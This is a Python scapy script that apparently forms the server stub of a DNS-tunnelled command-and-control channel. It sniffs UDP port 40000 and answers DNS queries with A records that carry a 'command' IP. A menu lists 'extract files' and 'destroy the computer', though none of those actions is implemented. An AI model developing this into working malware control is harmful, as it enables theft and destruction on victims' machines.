import struct
from scapy.all import *

MY_PORT = 40000

MENU = (
    "What would you like to do? "
    "1 - extract files, "
    "2 - destroy the computer, "
    "3 - self destruct, "
    "4 - do nothing"
)

def process_packet(packet):
    """
    Processes an incoming packet by parsing its UDP and DNS layers,
    then constructs and sends a DNS response.
    """
    packet.show()

    # Check for the UDP layer
    if packet.haslayer(UDP):
        udp_layer = packet[UDP]
        print("Parsed UDP layer:")
        print("  Source Port:", udp_layer.sport)
        print("  Destination Port:", udp_layer.dport)
        print("  Length:", udp_layer.len)
        print("  Checksum:", udp_layer.chksum)
        # The payload following the UDP header is assumed to be DNS data.
        dns_payload = bytes(udp_layer.payload)
    else:
        print("No UDP layer found.")
        return

    # Ensure the DNS payload is long enough for a header (12 bytes)
    if len(dns_payload) < 12:
        print("DNS payload too short for a header.")
        return

    # Parse DNS header fields
    transaction_id, flags, qdcount, ancount, nscount, arcount = \
        struct.unpack("!HHHHHH", dns_payload[:12])
    print("DNS Header:")
    print("  Transaction ID:", transaction_id)
    print("  Flags:", flags)
    print("  Questions:", qdcount)
    print("  Answer RRs:", ancount)
    print("  Authority RRs:", nscount)
    print("  Additional RRs:", arcount)

    # Parse the DNS query to extract the domain name
    domain = parse_dns_query(dns_payload)
    print("Domain:", domain)

    # Build the DNS response
    ip_command = "1.1.1.1"  # Placeholder IP address
    send_dns = build_dns_response(transaction_id, domain, ip_command)
    send_udp = create_udp_header(udp_layer.dport, udp_layer.sport, len(send_dns))
    payload = send_udp + send_dns

    # Send the response if the IP layer exists
    if packet.haslayer(IP):
        sender_ip = packet[IP].src
        print("Sender IP:", sender_ip)
        response = IP(dst=sender_ip, proto=17) / Raw(load=payload)
        print("Sending response ...")
        send(response)
    else:
        print("No IP layer found in the packet.")

def parse_dns_query(data):
    """
    Parses a DNS query from raw data and returns the queried domain name.
    """
    if len(data) < 12:
        raise ValueError("Data too short for a DNS header.")

    offset = 12  # Start of the Question section
    labels = []
    while True:
        if offset >= len(data):
            raise ValueError("Incomplete DNS query: reached end of data while parsing QNAME.")
        length = data[offset]
        offset += 1  # Move past the length byte

        if length == 0:  # End of QNAME
            break

        if offset + length > len(data):
            raise ValueError("Invalid DNS query: label length exceeds available data.")
        label = data[offset:offset + length].decode('ascii')
        labels.append(label)
        offset += length

    qname = ".".join(labels)
    return qname

def create_udp_header(src_port, dest_port, data_length):
    """
    Creates a UDP header given the source port, destination port, and data length.
    """
    length = 8 + data_length  # UDP header is 8 bytes plus the data length
    checksum = 0
    return struct.pack('!HHHH', src_port, dest_port, length, checksum)

def build_dns_response(transaction_id, domain, ip_command):
    """
    Builds a DNS response for an A record query using the provided transaction ID,
    domain name, and IP address.
    """
    flags = 0x8180  # Standard DNS response flag
    question_rrs = 1  # 1 question
    answer_rrs = 1    # 1 answer
    authority_rrs = 0 # No authority records
    additional_rrs = 0  # No additional records

    header = struct.pack("!HHHHHH",transaction_id, flags, question_rrs, answer_rrs, authority_rrs, additional_rrs)
    question = encode_domain_name(domain)

    qtype = 1   # Type A (IPv4 address)
    qclass = 1  # Class IN (Internet)
    q_properties = struct.pack("!HH", qtype, qclass)

    # Construct the answer section using a pointer for name compression
    name = 0xC00C  # Pointer to the domain name (offset 12 in the DNS message)
    rtype = 1   # Type A
    rclass = 1  # Class IN
    ttl = 300   # Time-to-live in seconds
    rdlength = 4  # Length of IPv4 address in bytes
    rdata = inet_aton(ip_command)  # Convert the IP command into bytes

    answer = struct.pack("!HHHIH", name, rtype, rclass, ttl, rdlength) + rdata

    response = header + question + q_properties + answer
    return response

def encode_domain_name(domain):
    """
    Encodes a domain name into the DNS query format.
    """
    labels = domain.split('.')
    encoded_name = b""
    for label in labels:
        encoded_name += struct.pack("B", len(label)) + label.encode()
    encoded_name += b"\x00"  # Null byte to terminate the domain name
    return encoded_name

def main():
    print("Running packet sniffer...")
    sniff(filter=f"udp and port {MY_PORT}", prn=process_packet)

if __name__ == "__main__":
    main()
